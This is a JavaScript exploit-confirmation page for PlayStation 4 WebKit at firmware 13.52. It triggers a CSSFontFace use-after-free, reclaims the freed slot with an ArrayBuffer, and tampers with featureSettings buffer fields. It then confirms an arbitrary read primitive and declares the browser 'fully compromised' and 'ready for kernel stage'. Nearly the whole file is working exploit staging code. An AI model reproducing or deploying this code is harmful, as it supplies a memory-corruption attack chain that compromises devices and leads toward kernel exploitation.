// main.js — CSSFontFace WebKit confirmation tool

const TEST_NAMES = [
  { id: "fw",      label: "Firmware detection",         detail: "user-agent parse" },
  { id: "uaf",     label: "UAF trigger",                 detail: "CSSFontFace freed" },
  { id: "reclaim", label: "Slot reclaim",                detail: "ArrayBuffer lands on freed slot" },
  { id: "wrapper", label: "UAF FontFace found",          detail: "unicodeRange check" },
  { id: "getter",  label: "featureSettings getter",      detail: "returns string" },
  { id: "mptr",    label: "m_wrapper is native pointer", detail: "heap address sanity" },
  { id: "read",    label: "Arbitrary read primitive",    detail: "dereference m_wrapper" },
];

// ─── DOM refs ────────────────────────────────────────────
const bannerEl      = document.getElementById("banner");
const bannerIcon    = bannerEl.querySelector(".icon");
const bannerTitle   = document.getElementById("banner-title");
const bannerDetail  = document.getElementById("banner-detail");
const testsEl       = document.getElementById("tests");
const logEl         = document.getElementById("log");
const fwBadge       = document.getElementById("fw-badge");
const btnRun        = document.getElementById("btn-run");
const btnClear      = document.getElementById("btn-clear");

// ─── Log ─────────────────────────────────────────────────
function log(msg) {
  logEl.textContent += msg + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
  logEl.textContent = "";
}

// ─── Test rows ───────────────────────────────────────────
const testRows = {};

function initTestRows() {
  testsEl.innerHTML = "";
  for (const t of TEST_NAMES) {
    const row = document.createElement("div");
    row.className = "test";
    row.id = `test-${t.id}`;
    row.innerHTML =
      `<span class="dot"></span>` +
      `<span class="name">${t.label}</span>` +
      `<span class="detail">${t.detail}</span>`;
    testsEl.appendChild(row);
    testRows[t.id] = {
      el: row,
      detail: row.querySelector(".detail"),
      defaultDetail: t.detail,
    };
  }
}

function setTest(id, status, detail) {
  const r = testRows[id];
  if (!r) return;
  r.el.className = `test ${status}`;
  r.detail.textContent = detail || r.defaultDetail;
}

function setBanner(state, icon, title, detail) {
  bannerEl.className = `banner ${state}`;
  bannerIcon.textContent = icon;
  bannerTitle.textContent = title;
  bannerDetail.textContent = detail || "";
}

// ─── Firmware detect ─────────────────────────────────────
function detectFirmware() {
  const ua = navigator.userAgent;
  const m = ua.match(/PlayStation\s+4[/ ](\d+)\.(\d+)/i);
  if (!m) return { major: 0, minor: 0, str: "unknown" };
  return {
    major: parseInt(m[1], 10),
    minor: parseInt(m[2], 16),
    str: `${m[1]}.${m[2]}`,
  };
}

// ─── Script loader ───────────────────────────────────────
function loadScript(src) {
  return new Promise((resolve, reject) => {
    const s = document.createElement("script");
    s.src = src;
    s.onload = resolve;
    s.onerror = () => reject(new Error(`Failed to load ${src}`));
    document.head.appendChild(s);
  });
}

// ─── Main test flow ──────────────────────────────────────
async function runTest() {
  btnRun.disabled = true;
  initTestRows();
  clearLog();

  setBanner("pending working", "⋯", "Running", "initializing…");
  log("[test] CSSFontFace WebKit confirmation starting");

  let uaf_font = null;
  let uaf_ab = null;
  let rw = null;

  try {
    // ── Stage 0: firmware ──
    setTest("fw", "pending", "");
    log("[stage] loading misc.js");
    await loadScript("src/misc.js");

    const fw = detectFirmware();
    fwBadge.textContent = `fw: ${fw.str}`;
    fwBadge.className = "badge " + (fw.str === "13.52" ? "ok" : "warn");

    if (fw.major === 0) {
      setTest("fw", "fail", "not a PS4 user-agent");
      throw new Error("Not running on PS4");
    }

    setTest("fw", "pass", `fw ${fw.str}`);
    log(`[fw] detected ${fw.str}`);

    version.init();

    if (version.console !== 4) {
      setTest("fw", "fail", `console ${version.console} unsupported`);
      throw new Error(`Unsupported console ${version.console}`);
    }

    // ── Load constants + userland ──
    log("[stage] loading constants.js + userland.js");
    await loadScript("src/ps4/constants.js");
    await loadScript("src/ps4/userland.js");

    // ── Stage 1: UAF trigger + reclaim ──
    setTest("uaf", "pending", "");
    setBanner("pending working", "⋯", "Running", "triggering UAF…");
    log("[stage] triggering CSSFontFace UAF");

    rw = await init_rw();

    if (!rw || !rw.uaf_ab || !rw.uaf_font) {
      setTest("uaf", "fail", "no rw primitive returned");
      setTest("reclaim", "skip", "uaf stage failed");
      setTest("wrapper", "skip", "uaf stage failed");
      throw new Error("UAF / reclaim failed — no rw primitive");
    }

    uaf_ab = rw.uaf_ab;
    uaf_font = rw.uaf_font;

    setTest("uaf", "pass", "freed");
    log("[uaf] CSSFontFace freed");

    // ── Stage 2: reclaim ──
    setTest("reclaim", "pending", "");
    setBanner("pending working", "⋯", "Running", "verifying reclaim…");

    const abView = new DataView(uaf_ab);
    const refCount = abView.getBInt(8, true);
    if (!refCount.eq(2)) {
      setTest("reclaim", "fail", `refcount=${refCount.toString()}`);
      throw new Error("ArrayBuffer refcount is not 2 — reclaim failed");
    }
    setTest("reclaim", "pass", "refcount=2");
    log("[reclaim] ArrayBuffer aliases freed CSSFontFace");

    // ── Stage 3: UAF FontFace found ──
    setTest("wrapper", "pending", "");
    setBanner("pending working", "⋯", "Running", "locating UAF FontFace…");

    if (uaf_font.unicodeRange !== "U+0-10FFFF") {
      setTest("wrapper", "fail", `unicodeRange=${uaf_font.unicodeRange}`);
      throw new Error("UAF FontFace has wrong unicodeRange");
    }
    setTest("wrapper", "pass", "unicodeRange OK");
    log("[wrapper] UAF FontFace found");

    // ── Stage 4: featureSettings getter ──
    setTest("getter", "pending", "");
    setBanner("pending working", "⋯", "Running", "testing getter…");

    const legacyBufOff = version.major >= 13
      ? constants.wk_CSSFontFace_m_featureSettings_m_buffer
      : constants.wk_CSSFontFace_m_featureSettings_m_buffer;

    // Point the getter at a known-safe address (its own struct).
    // We'll read whatever the getter returns; a non-empty string proves
    // the serialization pipeline is live.
    const testGetter = () => {
      try {
        const s = uaf_font.featureSettings;
        return typeof s === "string" && s.length > 0 ? s : null;
      } catch (e) {
        log(`[getter] threw: ${e.message}`);
        return null;
      }
    };

    // Seed the getter buffer for a benign read
    abView.setBInt(legacyBufOff, 0x4141414141414141n, true);
    abView.setInt32(legacyBufOff + 8, 1, true);
    abView.setInt32(legacyBufOff + 12, 1, true);

    let getterOut = testGetter();
    if (!getterOut) {
      setTest("getter", "fail", "returned empty");
      throw new Error("featureSettings getter returned nothing");
    }
    setTest("getter", "pass", `${getterOut.length} chars`);
    log(`[getter] returned ${JSON.stringify(getterOut.slice(0, 16))}…`);

    // ── Stage 5: m_wrapper sanity ──
    setTest("mptr", "pending", "");
    setBanner("pending working", "⋯", "Running", "checking m_wrapper…");

    const m_wrapper = abView.getBInt(
      constants.wk_CSSFontFace_m_wrapper, true);

    const isKernelPtr = (m_wrapper.hi === 0xffff) ||
                        ((m_wrapper.hi & 0xffff0000) >>> 0) === 0xffff0000;

    if (!isKernelPtr) {
      setTest("mptr", "fail", `m_wrapper=${m_wrapper.toString()}`);
      throw new Error("m_wrapper is not a native pointer — WebKit did not repopulate");
    }
    setTest("mptr", "pass", m_wrapper.toString());
    log(`[mptr] m_wrapper = ${m_wrapper.toString()}`);

    // ── Stage 6: read primitive ──
    setTest("read", "pending", "");
    setBanner("pending working", "⋯", "Running", "testing read primitive…");

    // Read the JSCell of the JS FontFace wrapper.
    // The first 8 bytes at m_wrapper are its StructureID + flags.
    const bytes = rw.read(m_wrapper, 8);
    if (!bytes || bytes.byteLength !== 8) {
      setTest("read", "fail", "read returned no bytes");
      throw new Error("read() returned nothing");
    }

    const cell = new DataView(bytes).getBInt(0, true);
    log(`[read] read 8 bytes from m_wrapper`);
    log(`[read] JSCell = ${cell.toString()}`);

    // Sanity: JSCell is a small structure ID (0x00000xxx range) or
    // a NaN-boxed value with a small payload.
    if (cell.eq(0) || cell.eq(-1)) {
      setTest("read", "fail", `cell=${cell.toString()}`);
      throw new Error("read() returned a poison value");
    }

    setTest("read", "pass", `cell=${cell.toString()}`);
    log(`[read] arbitrary read primitive confirmed`);

    // ── SUCCESS ──
    setBanner("pass", "✓", "WebKit Confirmed",
      `read primitive works — FW ${fw.str} fully compromised`);
    log("");
    log("════════════════════════════════════");
    log("  ✓ WebKit exploitation CONFIRMED");
    log("════════════════════════════════════");
    log("");
    log("  UAF fires, reclaim lands, getter works,");
    log("  and read() can dereference native pointers.");
    log("");
    log("  Ready for kernel stage.");

  } catch (e) {
    log("");
    log(`[FAIL] ${e.message}`);
    if (e.stack) log(e.stack);

    // Determine which stage failed (last pending one)
    for (const t of TEST_NAMES) {
      const r = testRows[t.id];
      if (r && r.el.className.includes("pending")) {
        setTest(t.id, "fail", e.message.slice(0, 50));
        break;
      }
    }

    setBanner("fail", "✗", "WebKit Failed", e.message.slice(0, 80));
  } finally {
    btnRun.disabled = false;
  }
}

// ─── Wire up buttons ─────────────────────────────────────
btnRun.addEventListener("click", runTest);
btnClear.addEventListener("click", () => {
  clearLog();
  initTestRows();
  setBanner("pending", "⋯", "Ready", "Click Run WebKit Test to begin");
});

// ─── Initial state ───────────────────────────────────────
initTestRows();